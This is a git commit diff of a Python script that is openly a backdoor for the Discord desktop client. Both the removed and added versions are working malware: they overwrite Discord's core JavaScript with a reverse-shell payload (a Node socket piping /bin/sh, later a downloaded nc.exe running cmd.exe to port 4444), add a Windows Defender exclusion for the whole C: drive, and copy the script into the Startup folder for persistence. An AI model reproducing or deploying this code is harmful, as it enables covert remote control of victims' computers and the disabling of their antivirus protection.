2c47e6675a46871bb4c352bb9c60dd9e69c342a9
Echo <66488397+NullByte75@users.noreply.github.com>
2021-02-14 11:16:04 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,58 +1,45 @@
 import os
-import subprocess
+import requests
 import shutil
-from pathlib import Path
 
 user = str(os.environ["USERNAME"])
-persistance = False
-alreadyBackdoored = False
-injected = False 
+basename = str(os.path.basename(__file__))
+
+payload = """const { exec } = require("child_process");
+exec("C:\\\\Users\\\\""" + user + """\\\\Documents\\\\nc.exe -vv 127.0.0.1 4444 -e cmd.exe", (error, stdout, stderr) => {
+if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+}
+if (stderr) {
+    console.log(`stderr: ${stderr}`);
+    return;
+}
+console.log(`stdout: ${stdout}`);
+});
+module.exports = require('./core.asar');
+"""
 
 def backdoor(filename):
-    payload = """module.exports = require('./core.asar');
-(function(){
-var net = require("net"),
-    cp = require("child_process"),
-    sh = cp.spawn("/bin/sh", []);
-var client = new net.Socket();
-client.connect(4242, "127.0.0.1", function(){
-    client.pipe(sh.stdin);
-    sh.stdout.pipe(client);
-    sh.stderr.pipe(client);
-});
-return /a/; // Prevents the Node.js application form crashing
-})();"""
-    with open(filename, 'rb') as file:
-        content = file.read()
+    r = requests.get("http://github.com/diegocr/netcat/raw/master/nc.exe", allow_redirects=True)
+    with open("C:\\Users\\" + user + "\\Documents\\nc.exe", "wb")as f3:
+        f3.write(r.content)
+    with open(filename, 'r') as f2:
+        content = f2.read()
         if content == payload:
-            injected = True
-    try:
-        with open(filename, 'w') as file2:
-            file2.write(payload)
-            injected = True
-    except:
-        injected = False
+            exit()
+        else:
+            f2.close()
+    with open(filename, 'w')as f:
+        f.write(payload)
 
-def disableAvAndPersistance():
-    os.system('powershell -Command Add-MpPreference -ExclusionPath "C:"')
-    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py"):
-        print("already backdoored")
-        exit()
-    else:
-        try:
-            shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.py")
-            persistance = True
-        except:
-            persistance = False
-
+def persistance():
+    shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    exit()
 
 def main():
-    disableAvAndPersistance()
-    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\"
-    my_path = Path(path)
-    for file in my_path.glob("**/*.js"):
-        backdoor(file)
-    if injected == False:
-        print("could not inject payload")
-        exit()
+    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
+    backdoor(path)
+    persistance()
+
 main()
